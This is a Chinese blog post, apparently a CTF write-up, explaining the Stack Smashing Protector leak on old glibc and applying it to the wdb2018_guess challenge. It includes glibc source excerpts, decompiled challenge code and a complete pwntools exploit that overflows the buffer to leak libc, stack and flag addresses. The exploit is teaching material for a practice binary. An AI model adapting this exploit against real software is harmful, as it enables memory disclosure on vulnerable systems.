@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon00.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="最近在出题啊，往安恒投题，能恰钱，收到邮件的时候很快乐">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Stack smash">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;09&#x2F;Stack-smash&#x2F;index.html">
+<meta property="og:site_name" content="N0vice&#39;s Blog">
+<meta property="og:description" content="最近在出题啊，往安恒投题，能恰钱，收到邮件的时候很快乐">
+<meta property="article:published_time" content="2020-04-09T12:40:10.000Z">
+<meta property="article:modified_time" content="2020-05-08T04:12:11.722Z">
+<meta property="article:author" content="N0vice">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/09/Stack-smash/"/>
+
+
+
+
+
+  <title>Stack smash | N0vice's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.1.0"></head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
+<script src="/live2d-widget/autoload.js"></script>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">N0vice's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/09/Stack-smash/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="N0vice">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="N0vice's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Stack smash</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-09T20:40:10+08:00">
+                2020-04-09
+              </time>
+            
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近在出题啊，往安恒投题，能恰钱，收到邮件的时候很快乐<a id="more"></a>  </p>
+<p>先简单讲一下fork函数，fork是复制一份进程，它会有两个返回值，用一个if条件，如果返回0，说明是子进程，如果返回是一个pid号，说明是父进程<br>什么意思呢？其实后面的这些不明白也不是很重要（目前来说），fork是复制一份进程，那么，触发canary的时候，程序崩溃，不会直接退出，而是再次执行子进程，子进程由于是复制而来的，所以所有内存布局，canary等值是一模一样的，那就快乐了，我写一个for循环fork，就能把触发canary而崩溃的程序重新执行，循环几次执行几次<br>SSP Leak又是什么呢？就是Stack Smashing Protector Leak，触发时会执行__stack_chk_fail函数，打印出”stack smashing detected”，并且后面会跟一个参数，正常来说这个参数就是程序名，但是如果我们通过栈溢出来将其覆盖成其他地址，就能通过触发canary打印出的报错信息来泄露我们想得到的内存数据，几乎可以实现任意地址读<br>但是有一点需要注意，SSP Leak只适用于ubuntu1604的环境，高版本libc已经不能利用这种技术来泄露了<br>先贴个源码比较一下<br>glibc2.23  </p>
+<pre><code class="C++"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span>
+<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span>
+
+
+<span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;
+
+<span class="keyword">void</span>
+__attribute__ ((noreturn)) internal_function
+__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)
+{
+  <span class="comment">/* The loop is added only to keep gcc happy.  */</span>
+  <span class="keyword">while</span> (<span class="number">1</span>)
+    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,
+            msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);
+}
+libc_hidden_def (__fortify_fail)</code></pre>
+<p>glibc2.27  </p>
+<pre><code class="C++"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span>
+<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span>
+
+
+<span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;
+
+<span class="keyword">void</span>
+__attribute__ ((noreturn))
+__fortify_fail_abort (<span class="built_in">_Bool</span> need_backtrace, <span class="keyword">const</span> <span class="keyword">char</span> *msg)
+{
+  <span class="comment">/* The loop is added only to keep gcc happy.  Don't pass down</span>
+<span class="comment">     __libc_argv[0] if we aren't doing backtrace since __libc_argv[0]</span>
+<span class="comment">     may point to the corrupted stack.  */</span>
+  <span class="keyword">while</span> (<span class="number">1</span>)
+    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,
+            <span class="string">"*** %s ***: %s terminated\n"</span>,
+            msg,
+            (need_backtrace &amp;&amp; __libc_argv[<span class="number">0</span>] != <span class="literal">NULL</span>
+             ? __libc_argv[<span class="number">0</span>] : <span class="string">"&lt;unknown&gt;"</span>));
+}
+
+<span class="keyword">void</span>
+__attribute__ ((noreturn))
+__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)
+{
+  __fortify_fail_abort (<span class="literal">true</span>, msg);
+}
+
+libc_hidden_def (__fortify_fail)
+libc_hidden_def (__fortify_fail_abort)</code></pre>
+<p>通过实验发现，在glibc2.27的环境下只会打印unknown<br>例题：wdb2018_guess<br><a href="https://buuoj.cn/challenges#wdb2018_guess" target="_blank" rel="noopener">题目下载地址</a><br>检查保护  </p>
+<pre><code class="shell">➜  wdb2018_guess checksec GUESS
+[*] &#39;/home/N0vice/Desktop/BUUCTF/wdb2018_guess/GUESS&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre>
+<p>IDA分析下伪代码  </p>
+<pre><code class="C++">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span>
+<span class="function"></span>{
+  __WAIT_STATUS stat_loc; <span class="comment">// [rsp+14h] [rbp-8Ch]</span>
+  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-84h]</span>
+  __int64 v6; <span class="comment">// [rsp+20h] [rbp-80h]</span>
+  __int64 v7; <span class="comment">// [rsp+28h] [rbp-78h]</span>
+  <span class="keyword">char</span> buf; <span class="comment">// [rsp+30h] [rbp-70h]</span>
+  <span class="keyword">char</span> s2; <span class="comment">// [rsp+60h] [rbp-40h]</span>
+  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span>
+
+  v10 = __readfsqword(<span class="number">0x28</span>u);
+  v7 = <span class="number">3L</span>L;
+  LODWORD(stat_loc.__uptr) = <span class="number">0</span>;
+  v6 = <span class="number">0L</span>L;
+  sub_4009A6(a1, a2, a3);
+  HIDWORD(stat_loc.__iptr) = <span class="built_in">open</span>(<span class="string">"./flag.txt"</span>, <span class="number">0</span>);
+  <span class="keyword">if</span> ( HIDWORD(stat_loc.__iptr) == <span class="number">-1</span> )
+  {
+    perror(<span class="string">"./flag.txt"</span>);
+    _exit(<span class="number">-1</span>);
+  }
+  <span class="built_in">read</span>(SHIDWORD(stat_loc.__iptr), &amp;buf, <span class="number">0x30</span>uLL);
+  <span class="built_in">close</span>(SHIDWORD(stat_loc.__iptr));
+  <span class="built_in">puts</span>(<span class="string">"This is GUESS FLAG CHALLENGE!"</span>);
+  <span class="keyword">while</span> ( <span class="number">1</span> )
+  {
+    <span class="keyword">if</span> ( v6 &gt;= v7 )
+    {
+      <span class="built_in">puts</span>(<span class="string">"you have no sense... bye :-) "</span>);
+      <span class="keyword">return</span> <span class="number">0L</span>L;
+    }
+    v5 = sub_400A11();
+    <span class="keyword">if</span> ( !v5 )
+      <span class="keyword">break</span>;
+    ++v6;
+    wait((__WAIT_STATUS)&amp;stat_loc);
+  }
+  <span class="built_in">puts</span>(<span class="string">"Please type your guessing flag"</span>);
+  gets(&amp;s2);
+  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;buf, &amp;s2) )
+    <span class="built_in">puts</span>(<span class="string">"You must have great six sense!!!! :-o "</span>);
+  <span class="keyword">else</span>
+    <span class="built_in">puts</span>(<span class="string">"You should take more effort to get six sence, and one more challenge!!"</span>);
+  <span class="keyword">return</span> <span class="number">0L</span>L;
+}</code></pre>
+<pre><code class="C++">__<span class="function">int64 <span class="title">sub_400A11</span><span class="params">()</span></span>
+<span class="function"></span>{
+  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span>
+
+  v1 = fork();
+  <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )
+    err(<span class="number">1</span>, <span class="string">"can not fork"</span>);
+  <span class="keyword">return</span> v1;
+}</code></pre>
+<p>用了while循环和if判断，使我们能进行3次猜测<br>主要思路如下：<br>计算可控输入首地址和<strong>libc_argv[0]之间的偏移，将</strong>libc_argv[0]覆盖成puts_got，泄露libc_base<br>泄露栈地址<br>计算栈地址与flag之间的距离，得到flag的地址<br>覆盖__libc_argv[0]为成flag地址，泄露flag<br>exp：  </p>
+<pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
+<span class="comment">#coding=utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span>*
+<span class="keyword">import</span> sys
+<span class="comment">#context.log_level = 'debug'</span>
+context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
+binary = <span class="string">'./pwn1'</span> 
+local = <span class="number">1</span>
+<span class="keyword">if</span> local == <span class="number">1</span>:
+    p=process(binary)
+<span class="keyword">else</span>:
+    p=remote(<span class="string">""</span>,)
+elf=ELF(binary)
+libc=elf.libc
+<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>
+    p.recvuntil(<span class="string">"flag\n"</span>)
+    payload = <span class="string">"a"</span>*<span class="number">296</span> + p64(elf.got[<span class="string">'puts'</span>])
+    p.sendline(payload)
+    p.recvuntil(<span class="string">"*** stack smashing detected ***: "</span>)
+    puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))
+    libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]
+    log.success(<span class="string">"puts_addr==&gt;"</span> + hex(puts_addr))
+    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
+    environ = libc_base + libc.sym[<span class="string">'environ'</span>]
+    p.recvuntil(<span class="string">"flag\n"</span>)
+    payload = <span class="string">"a"</span>*<span class="number">296</span> + p64(environ)
+    p.sendline(payload)
+    p.recvuntil(<span class="string">"*** stack smashing detected ***: "</span>)
+    stack_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))
+    log.success(<span class="string">"stack_addr==&gt;"</span> + hex(stack_addr))
+    flag = stack_addr - <span class="number">0x168</span>
+    p.recvuntil(<span class="string">"flag\n"</span>)
+    payload = <span class="string">"a"</span>*<span class="number">296</span> + p64(flag)
+    p.sendline(payload)
+    p.interactive()
+exp()</code></pre>
+<p>参考链接：<br><a href="https://cloud.tencent.com/developer/article/1607482" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1607482</a><br><a href="https://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/" target="_blank" rel="noopener">https://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/</a><br><a href="http://www.pwn4fun.com/pwn/stack-pivot-and-stack-smash.html#2018%E7%BD%91%E9%BC%8E%E6%9D%AFGUESS" target="_blank" rel="noopener">http://www.pwn4fun.com/pwn/stack-pivot-and-stack-smash.html#2018%E7%BD%91%E9%BC%8E%E6%9D%AFGUESS</a><br><a href="https://bbs.pediy.com/thread-224643.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224643.htm</a>  </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的鼓励将支持我继续努力！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="N0vice 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="N0vice 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    N0vice
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2020/04/09/Stack-smash/" title="Stack smash">http://yoursite.com/2020/04/09/Stack-smash/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/22/%E7%AC%AC%E4%BA%8C%E5%B1%8ABJDCTF/" rel="next" title="第二届BJDCTF">
+                <i class="fa fa-chevron-left"></i> 第二届BJDCTF
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/16/0ctf2017-babyheap/" rel="prev" title="0ctf2017 babyheap">
+                0ctf2017 babyheap <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="N0vice" />
+            
+              <p class="site-author-name" itemprop="name">N0vice</p>
+              <p class="site-description motion-element" itemprop="description">从前我是瞎的，如今我看得见</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/N0vice21" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/luo-yu-piao" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-zhihu"></i>知乎</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://spacey.top/" title="Elli0t" target="_blank">Elli0t</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.ericdshen.com/" title="EDS" target="_blank">EDS</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://migraine-sudo.github.io" title="Migraine" target="_blank">Migraine</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://shawroot.cc/" title="Root" target="_blank">Root</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.yuque.com/pi3ntn/azmee3" title="Lime" target="_blank">Lime</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://mrbelieve128.github.io/" title="Mr.Believe" target="_blank">Mr.Believe</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://l0x1c.github.io/" title="L0x1c" target="_blank">L0x1c</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://binlep.top/" title="binlep" target="_blank">binlep</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://1p0ch.cn/" title="1p0ch" target="_blank">1p0ch</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://retr0.vip/" title="Retr_0" target="_blank">Retr_0</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hackerpoet.com/" title="T4rn" target="_blank">T4rn</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/SopRomeo" title="penson" target="_blank">penson</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/lemon629/" title="lemon" target="_blank">lemon</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://surager.pub/" title="5ur4g3r" target="_blank">5ur4g3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.snowywar.top/" title="snowywar" target="_blank">snowywar</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">N0vice</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
